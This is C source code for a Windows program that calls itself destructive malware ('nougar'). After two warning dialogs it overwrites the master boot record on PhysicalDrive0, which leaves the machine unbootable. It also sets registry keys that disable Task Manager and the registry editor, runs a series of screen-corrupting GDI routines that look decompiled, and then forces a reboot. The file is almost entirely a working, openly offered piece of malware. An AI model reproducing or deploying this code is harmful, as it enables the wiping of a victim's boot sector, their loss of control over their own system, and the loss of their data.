#include <Windows.h>

const unsigned char MasterBootRecord[512] = {};


DWORD WINAPI Disable(LPVOID lpParam) {
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f");
    return 0;
}
DWORD WINAPI payload1(LPVOID lpParam) {
    {
        int v0; // eax
        int nWidth; // [rsp+54h] [rbp+4h]
        int nHeight; // [rsp+74h] [rbp+24h]
        void* lpvBits; // [rsp+98h] [rbp+48h]
        HDC hdc; // [rsp+B8h] [rbp+68h]
        HDC hdcSrc; // [rsp+D8h] [rbp+88h]
        HBITMAP h; // [rsp+F8h] [rbp+A8h]
        int i; // [rsp+114h] [rbp+C4h]
        int j; // [rsp+134h] [rbp+E4h]

        nWidth = GetSystemMetrics(0);
        nHeight = GetSystemMetrics(1);
        lpvBits = VirtualAlloc(0i64, 4i64 * (nWidth + nHeight * nWidth), 0x3000u, 4u);
        for (i = 0; ; i = (i + 1) % 6)
        {
            hdc = GetDC(0i64);
            hdcSrc = CreateCompatibleDC(hdc);
            h = CreateBitmap(nWidth, nHeight, 1u, 0x20u, lpvBits);
            SelectObject(hdcSrc, h);
            BitBlt(hdcSrc, 0, 0, nWidth, nHeight, hdc, 0, 0, 0xCC0020u);
            GetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
            for (j = 0; nHeight * nWidth > j; ++j)
                *((BYTE*)lpvBits + 4 * j + 2) = (nWidth / nHeight + 2 * (j + nHeight * j) + j + nWidth * j - 1) | (j + nHeight * j);
            SetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
            BitBlt(hdc, 0, 0, nWidth, nHeight, hdcSrc, 0, 0, 0x440328u);
            DeleteObject(h);
            DeleteObject(hdcSrc);
            DeleteObject(hdc);
            v0 = rand();
            Sleep(v0 % 100);
        }
    }
}
DWORD WINAPI payload2(LPVOID lpParam) {
        int v0; // eax
        int nWidth; // [rsp+54h] [rbp+4h]
        int nHeight; // [rsp+74h] [rbp+24h]
        void* lpvBits; // [rsp+98h] [rbp+48h]
        HDC hdc; // [rsp+B8h] [rbp+68h]
        HDC hdcSrc; // [rsp+D8h] [rbp+88h]
        HBITMAP h; // [rsp+F8h] [rbp+A8h]
        int i; // [rsp+114h] [rbp+C4h]
        int j; // [rsp+134h] [rbp+E4h]

        nWidth = GetSystemMetrics(0);
        nHeight = GetSystemMetrics(1);
        lpvBits = VirtualAlloc(0i64, 4i64 * (nWidth + nHeight * nWidth), 0x3000u, 4u);
        for (i = 0; ; i = (i + 1) % 6)
        {
            hdc = GetDC(0i64);
            hdcSrc = CreateCompatibleDC(hdc);
            h = CreateBitmap(nWidth, nHeight, 1u, 0x20u, lpvBits);
            SelectObject(hdcSrc, h);
            BitBlt(hdcSrc, 0, 0, nWidth, nHeight, hdc, 0, 0, 0xCC0020u);
            GetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
            for (j = 0; nHeight * nWidth > j; ++j)
                *((BYTE*)lpvBits + 4 * j + 2) = (nWidth / nHeight + 2 * (j + nHeight * j) + j + nWidth * j - 1) | (j + nHeight * j);
            SetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
            BitBlt(hdc, 0, 0, nWidth, nHeight, hdcSrc, 0, 0, 0x440328u);
            DeleteObject(h);
            DeleteObject(hdcSrc);
            DeleteObject(hdc);
            v0 = rand();
            Sleep(v0 % 100);
        }
}
DWORD WINAPI payload3(LPVOID lpParam) {
    {
        unsigned __int64 v0; // rax
        unsigned int v1; // eax
        HBRUSH HatchBrush; // rax
        unsigned int v3; // eax
        HDC hdc; // [rsp+58h] [rbp+8h]
        unsigned int SystemMetrics; // [rsp+74h] [rbp+24h]
        unsigned int v6; // [rsp+94h] [rbp+44h]
        int v7; // [rsp+164h] [rbp+114h]
        unsigned int bottom; // [rsp+164h] [rbp+114h]
        int right; // [rsp+168h] [rbp+118h]
        unsigned int righta; // [rsp+168h] [rbp+118h]
        unsigned int color; // [rsp+16Ch] [rbp+11Ch]
        int colora; // [rsp+16Ch] [rbp+11Ch]

        while (1)
        {
            hdc = GetDC(0i64);
            SystemMetrics = GetSystemMetrics(0);
            v6 = GetSystemMetrics(1);
            v0 = __rdtsc();
            v7 = (unsigned int)0xFF;
            right = (((unsigned int)0xFF) << 8) | v7;
            color = (((unsigned int)0xFF) << 16) | right;
            v1 = GetSystemMetrics(1);
            HatchBrush = CreateHatchBrush(v1 % 7, color);
            SelectObject(hdc, HatchBrush);
            bottom = (unsigned int)v6;
            righta = (unsigned int)SystemMetrics;
            colora = (unsigned int)v6;
            v3 = GetSystemMetrics(1);
            Rectangle(hdc, v3 % SystemMetrics, colora, righta, bottom);
            BitBlt(hdc, 1, 1, SystemMetrics - 2, v6 - 2, hdc, 0, 0, 0xCC0020u);
            BitBlt(hdc, -1, -1, SystemMetrics + 2, v6 + 2, hdc, 0, 0, 0xCC0020u);
            Sleep(0xAu);
        }
    }
}

DWORD WINAPI payload4(LPVOID lpParam) {
    {
        int wSrc; // [rsp+64h] [rbp+4h]
        int hSrc; // [rsp+84h] [rbp+24h]
        HDC hdcDest; // [rsp+C8h] [rbp+68h]

        while (1)
        {
            wSrc = GetSystemMetrics(0);
            hSrc = GetSystemMetrics(1);
            GetDesktopWindow();
            hdcDest = GetDC(0i64);
            StretchBlt(hdcDest, -500, -500, wSrc + 1000, hSrc + 1000, hdcDest, 0, 0, wSrc, hSrc, 0xCC0020u);
            StretchBlt(hdcDest, 500, 500, wSrc - 1000, hSrc - 1000, hdcDest, 0, 0, wSrc, hSrc, 0xCC0020u);
            DeleteDC(hdcDest);
        }
    }
}
DWORD WINAPI payload5(LPVOID lpParam) {
        int v0; // eax
        HDC hdc; // [rsp+58h] [rbp+8h]
        int SystemMetrics; // [rsp+74h] [rbp+24h]
        int cy; // [rsp+94h] [rbp+44h]
        int y1; // [rsp+164h] [rbp+114h]
        int x1; // [rsp+168h] [rbp+118h]
        int y; // [rsp+16Ch] [rbp+11Ch]

        GetDC(0i64);
        SystemMetrics = GetSystemMetrics(0);
        cy = GetSystemMetrics(1);
        while (1)
        {
            hdc = GetDC(0i64);
            y1 = rand() % -45;
            x1 = rand() % 50;
            y = rand() % 50;
            v0 = rand();
            BitBlt(hdc, v0 % -45, y, SystemMetrics, cy, hdc, x1, y1, 0xCC0020u);
            DeleteDC(hdc);
        }
    }
DWORD WINAPI payload6(LPVOID lpParam) {
        char* v0; // rdi
        __int64 i; // rcx
        HWND DesktopWindow; // rax
        int v3; // eax
        HBRUSH SolidBrush; // rax
        char v5; // [rsp+50h] [rbp+0h] BYREF
        HDC hdc; // [rsp+58h] [rbp+8h]
        HDC hdcDest; // [rsp+78h] [rbp+28h]
        struct tagRECT Rect; // [rsp+98h] [rbp+48h] BYREF
        POINT Point; // [rsp+C8h] [rbp+78h] BYREF
        int v10; // [rsp+D0h] [rbp+80h]
        int v11; // [rsp+D4h] [rbp+84h]
        int v12; // [rsp+D8h] [rbp+88h]
        int v13; // [rsp+DCh] [rbp+8Ch]
        int SystemMetrics; // [rsp+F4h] [rbp+A4h]
        int cy; // [rsp+114h] [rbp+C4h]
        HGDIOBJ h; // [rsp+138h] [rbp+E8h]
        int v17; // [rsp+204h] [rbp+1B4h]
        unsigned int v18; // [rsp+208h] [rbp+1B8h]

        v0 = &v5;
        for (i = 70i64; i; --i)
        {
            v0 += 4;
        }
        while (1)
        {
            hdc = GetDC(0i64);
            hdcDest = CreateCompatibleDC(hdc);
            SystemMetrics = GetSystemMetrics(0);
            cy = GetSystemMetrics(1);
            h = CreateCompatibleBitmap(hdc, SystemMetrics, cy);
            SelectObject(hdcDest, h);
            DesktopWindow = GetDesktopWindow();
            GetWindowRect(DesktopWindow, &Rect);
            Point.x = Rect.left - 79;
            Point.y = Rect.top + 26;
            v10 = Rect.right - 43;
            v11 = Rect.top - 26;
            v12 = Rect.left + 79;
            v13 = Rect.bottom + 53;
            PlgBlt(hdcDest, &Point, hdc, Rect.left, Rect.top, Rect.right - Rect.left, Rect.bottom - Rect.top, 0i64, 0, 0);
            v17 = (unsigned __int8)(rand() % 255);
            v18 = ((unsigned __int8)(rand() % 255) << 8) | v17;
            v3 = rand();
            SolidBrush = CreateSolidBrush(((unsigned __int8)(v3 % 255) << 16) | v18);
            SelectObject(hdc, SolidBrush);
            BitBlt(hdc, 0, 0, SystemMetrics, cy, hdcDest, 0, 0, 0x27E4221u);
            DeleteDC(hdc);
            DeleteObject(h);
        }
    }
DWORD WINAPI payload7(LPVOID lpParam) {
  int hSrc; // [rsp+60h] [rbp-10h]
  int wSrc; // [rsp+64h] [rbp-Ch]
  HDC hdcDest; // [rsp+68h] [rbp-8h]

  GetDC(0i64);
  wSrc = GetSystemMetrics(0);
  for (hSrc = GetSystemMetrics(1);
        ;
        StretchBlt(hdcDest, 16, 16, wSrc - 32, hSrc - 32, hdcDest, -1, -1, wSrc, hSrc, 0xCC0020u))
  {
    hdcDest = GetDC(0i64);
    StretchBlt(hdcDest, -16, -16, wSrc + 32, hSrc + 32, hdcDest, 1, 1, wSrc, hSrc, 0xCC0020u);
  }
}
DWORD WINAPI payload8(LPVOID lpParam) {
    int hSrc; // [rsp+60h] [rbp-10h]
    int wSrc; // [rsp+64h] [rbp-Ch]
    HDC hdcDest; // [rsp+68h] [rbp-8h]

    hdcDest = GetDC(0i64);
    wSrc = GetSystemMetrics(0);
    for (hSrc = GetSystemMetrics(1); ; StretchBlt(
        hdcDest,
        1,
        1,
        wSrc - 2,
        hSrc - 2,
        hdcDest,
        0,
        0,
        wSrc,
        hSrc,
        0xCC0020u))
        ;
}
DWORD WINAPI payload9(LPVOID lpParam) {
    int v0; // eax
    HBRUSH SolidBrush; // rax
    int v2; // eax
    HDC hdc; // [rsp+58h] [rbp+8h]
    HDC hdca; // [rsp+58h] [rbp+8h]
    HDC hdcSrc; // [rsp+78h] [rbp+28h]
    int SystemMetrics; // [rsp+94h] [rbp+44h]
    int cy; // [rsp+B4h] [rbp+64h]
    int v8; // [rsp+184h] [rbp+134h]
    int y1; // [rsp+184h] [rbp+134h]
    int v10; // [rsp+188h] [rbp+138h]
    int x1; // [rsp+188h] [rbp+138h]
    int y; // [rsp+18Ch] [rbp+13Ch]

    hdc = GetDC(0i64);
    hdcSrc = CreateCompatibleDC(hdc);
    SystemMetrics = GetSystemMetrics(0);
    cy = GetSystemMetrics(1);
    while (1)
    {
        hdca = GetDC(0i64);
        v8 = (unsigned __int8)(rand() % 255);
        v10 = ((unsigned __int8)(rand() % 255) << 8) | v8;
        v0 = rand();
        SolidBrush = CreateSolidBrush(((unsigned __int8)(v0 % 255) << 16) | (unsigned int)v10);
        SelectObject(hdcSrc, SolidBrush);
        y1 = rand() % 23;
        x1 = rand() % 13;
        y = rand() % 13;
        v2 = rand();
        BitBlt(hdca, v2 % 23, y, SystemMetrics, cy, hdcSrc, x1, y1, 0x5A0049u);
        DeleteObject(hdcSrc);
        DeleteDC(hdca);
    }
}
DWORD WINAPI payload10 (LPVOID lpParam) {
    int hSrc; // [rsp+60h] [rbp-10h]
    int wSrc; // [rsp+64h] [rbp-Ch]
    HDC hdc; // [rsp+68h] [rbp-8h]

    while (1)
    {
        hdc = GetDC(0i64);
        wSrc = GetSystemMetrics(0);
        hSrc = GetSystemMetrics(1);
        SetStretchBltMode(hdc, 4);
        StretchBlt(hdc, 0, 0, wSrc + 1, hSrc + 1, hdc, 0, 0, wSrc, hSrc, 0xCC0020u);
        StretchBlt(hdc, 0, 0, wSrc - 1, hSrc - 1, hdc, 0, 0, wSrc, hSrc, 0xCC0020u);
        ReleaseDC(0i64, hdc);
    }
}
DWORD WINAPI payload11(LPVOID lpParam) {
    __int64 v2; // rax
    char* v3; // r8
    __int64 v4; // rax
    int v5; // eax
    HBITMAP h; // [rsp+50h] [rbp-40h]
    HDC hdcSrc; // [rsp+58h] [rbp-38h]
    HDC hdc; // [rsp+60h] [rbp-30h]
    char* lpvBits; // [rsp+68h] [rbp-28h]
    int nHeight; // [rsp+74h] [rbp-1Ch]
    int nWidth; // [rsp+78h] [rbp-18h]
    DWORD TickCount; // [rsp+7Ch] [rbp-14h]
    int j; // [rsp+80h] [rbp-10h]
    char v14; // [rsp+87h] [rbp-9h]
    int v15; // [rsp+88h] [rbp-8h]
    int i; // [rsp+8Ch] [rbp-4h]

    TickCount = GetTickCount();
    nWidth = GetSystemMetrics(0);
    nHeight = GetSystemMetrics(1);
    lpvBits = (char*)VirtualAlloc(0i64, 4i64 * nWidth * (nHeight + 1), 0x3000u, 4u);
    for (i = 0; ; i = (i + 1) % 3)
    {
        hdc = GetDC(0i64);
        hdcSrc = CreateCompatibleDC(hdc);
        h = CreateBitmap(nWidth, nHeight, 1u, 0x20u, lpvBits);
        SelectObject(hdcSrc, h);
        BitBlt(hdcSrc, 0, 0, nWidth, nHeight, hdc, 0, 0, 0xCC0020u);
        BitBlt(hdc, 0, 0, nWidth, nHeight, hdc, 5 - nWidth, 0, 0xCC0020u);
        GetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
        v14 = 0;
        if (GetTickCount() - TickCount > 0xEA60)
            v14 = rand() & 0xDC;
        for (j = 0; nHeight * nWidth > j; ++j)
        {
            v15 = rand() % 50;
            if (!(j % nHeight) && !(rand() % 100))
                v15 = rand() % 70 + 40;
            if (v15)
                v2 = 1500i64;
            else
                v2 = 160i64;
            v3 = &lpvBits[4 * j + 24 + 4 * (__int64)v15 + v2];
            if (v15)
                v4 = 1500i64;
            else
                v4 = 160i64;
            *v3 = lpvBits[4 * j + 24 + 4 * (__int64)v15 + v4] + (v14 ^ lpvBits[4 * j + 4 * (__int64)v15 + j % 100]);
        }
        SetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
        BitBlt(hdc, 0, 0, nWidth, nHeight, hdc, 5, 0, 0xCC0020u);
        BitBlt(hdc, 0, 0, nWidth, nHeight, hdcSrc, 5, 0, 0x8800C6u);
        DeleteObject(h);
        DeleteObject(hdcSrc);
        DeleteObject(hdc);
        v5 = rand();
        Sleep(v5 % 10 + 2);
    }
}

int main() {
    HANDLE v5; // edi
    HANDLE v6; // edi
    HANDLE v7; // edi
    HANDLE v8; // esi
    HANDLE v9; // esi
    HANDLE v10; // esi
    HANDLE v11; // esi
    HANDLE v12; // esi
    HANDLE v13; // esi
    HANDLE v14; // edi
    HANDLE v16; // esi
    HANDLE v17; // esi
    HANDLE v18; // esi
    HANDLE v19; // ebx
    HANDLE v20; // edi
    HANDLE v21; // esi
    HANDLE v22; // esi
    HANDLE v23; // esi
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    if (MessageBoxW(NULL, L"Hello there\r\n\You executed the dangerous malware named nougar that can corrupt your system\r\n\I am not responsible for any damages\r\n\If you click yes 2 attempts, your computer is been corrupted\r\n\Execute???", L"WARNING CORRUPTION HELL INCOMING!!!", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"LAST WARNING!!!\r\n\IT HURTS REALLY YOUR REAL PC!!!\r\n\FINALLY EXECUTE IT???", L"LAST WARNING!!!", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else
        {
            DWORD NumberOfBytesWritten; // [esp+10h] [ebp-8h]
            v7 = CreateFileW(L"\\\\.\\PhysicalDrive0", 0x10000000u, 3u, 0, 3u, 0, 0);
            WriteFile(v7, "ë", 0x200u, &NumberOfBytesWritten, 0);
            CloseHandle(v7);
            v6 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload1, 0, 0, 0);
            v5 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Disable, 0, 0, 0);
            Sleep(0x7530u);
            TerminateThread(v6, 0);
            CloseHandle(v6);
            InvalidateRect(0, 0, 0);
            v8 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload2, 0, 0, 0);
            Sleep(0x3A98u);
            TerminateThread(v8, 0);
            CloseHandle(v8);
            InvalidateRect(0, 0, 0);
            v9 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload3, 0, 0, 0);
            Sleep(0x61A8u);
            TerminateThread(v9, 0);
            CloseHandle(v9);
            InvalidateRect(0, 0, 0);
            v10 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload4, 0, 0, 0);
            Sleep(0x61A8u);
            TerminateThread(v10, 0);
            CloseHandle(v10);
            v11 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload5, 0, 0, 0);
            Sleep(0x3A98u);
            TerminateThread(v11, 0);
            CloseHandle(v11);
            v12 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload6, 0, 0, 0);
            Sleep(0x61A8u);
            TerminateThread(v12, 0);
            CloseHandle(v12);
            v13 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload7, 0, 0, 0);
            Sleep(0x61A8u);
            TerminateThread(v13, 0);
            CloseHandle(v13);
            v14 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload8, 0, 0, 0);
            Sleep(0x4E20u);
            TerminateThread(v14, 0);
            CloseHandle(v14);
            v16 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload9, 0, 0, 0);
            Sleep(0x61A8u);
            TerminateThread(v16, 0);
            CloseHandle(v16);
            v17 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload10, 0, 0, 0);
            Sleep(0x61A8u);
            TerminateThread(v17, 0);
            CloseHandle(v17);
            v18 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload11, 0, 0, 0);
            Sleep(0x61A8u);
            system("C:\\Windows\\System32\\shutdown /r t- 0");
        }
    }
}